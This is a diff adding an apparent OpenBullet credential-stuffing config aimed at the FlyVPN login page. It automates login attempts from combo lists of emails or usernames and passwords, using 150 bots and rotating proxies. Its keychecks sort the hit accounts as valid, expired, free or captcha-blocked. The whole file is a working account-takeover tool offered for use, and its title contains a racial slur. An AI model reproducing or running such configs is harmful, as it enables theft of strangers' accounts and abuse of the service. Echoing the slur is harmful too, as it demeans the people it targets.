@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "Fly VPN only nikkers ",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2019-08-19T02:43:00.6042448-07:00",
+  "AdditionalInfo": "Use Elite Proxies",
+  "Author": "MESVAK",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 5,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#MESVAK REQUEST POST "https://www.flyvpn.com/User/Login?returl=%2FIndex%2FIndex" 
+  CONTENT "AccountName=<USER>&Mode=email&email=jeo&phone=&Password=<PASS>&RememberLogin=0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.flyvpn.com" 
+  HEADER "referer: https://www.flyvpn.com/login?returl=/Index/Index" 
+
+#MESVAK KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<span class=\"userinfo-tips\"></" 
+  KEYCHAIN Failure OR 
+    KEY "<title>Log in - FlyVPN" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<h2>Select Payment Method</h2>" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<h2>Free VPN Service</h2>" 
+  KEYCHAIN Retry OR 
+    KEY "<input type=\"text\" style=\"width:180px;\" id='CaptchaText' name=\"CaptchaText\" placeholder=\"Captcha\" />" 
+
